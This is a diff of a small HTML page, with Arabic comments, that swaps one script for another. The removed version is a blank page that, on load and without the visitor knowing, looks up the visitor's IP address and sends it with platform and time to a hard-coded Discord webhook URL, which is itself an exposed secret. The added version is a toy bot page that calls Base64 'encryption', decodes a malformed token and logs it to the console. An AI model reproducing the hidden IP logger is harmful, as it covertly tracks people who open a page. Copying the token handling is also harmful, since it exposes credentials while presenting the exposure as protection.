@@ -1,39 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title></title>
+    <title>Discord Bot</title>
 </head>
-<body style="margin:0;padding:0;background:#ffffff;width:100vw;height:100vh;overflow:hidden;">
+<body>
+    <h1>🤖 Discord Bot</h1>
+    <button onclick="startBot()">تشغيل البوت</button>
+    <div id="status"></div>
+
     <script>
-        // ===== WEBHOOK URL =====
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1344722110161092690/Ka3l2MCnEpZpk-MHA2RBli7HxEHxll6S-S8LjZeCCSpoRj_NIMKCcOX-AZYqYWl1bVq8";
-        // =========================
-        
-        async function sendIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                const ip = data.ip;
-                
-                const info = {
-                    ip: ip,
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    time: new Date().toISOString()
-                };
-                
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🎯 **New Visitor**\nIP: \`${ip}\`\nPlatform: \`${info.platform}\`\nTime: \`${info.time}\``
-                    })
-                });
-            } catch(e) {}
+        // ========== التوكن مشفر بـ Base64 ==========
+        const encodedToken = "TVRNMk5UUTRNRFF6TURFMU1qUXpOVEl4TXc=R";
+
+        // دالة فك التشفير
+        function decodeToken(encoded) {
+            return atob(encoded);
         }
-        
-        sendIP();
+
+        // دالة تشغيل البوت (هنا البوت مش بيشتغل فعلياً، بس مثال)
+        function startBot() {
+            const token = decodeToken(encodedToken);
+            document.getElementById('status').innerHTML = `✅ تم تشغيل البوت بالتوكن: ${token.substring(0, 10)}...`;
+            console.log('Token:', token);
+        }
     </script>
 </body>
 </html>
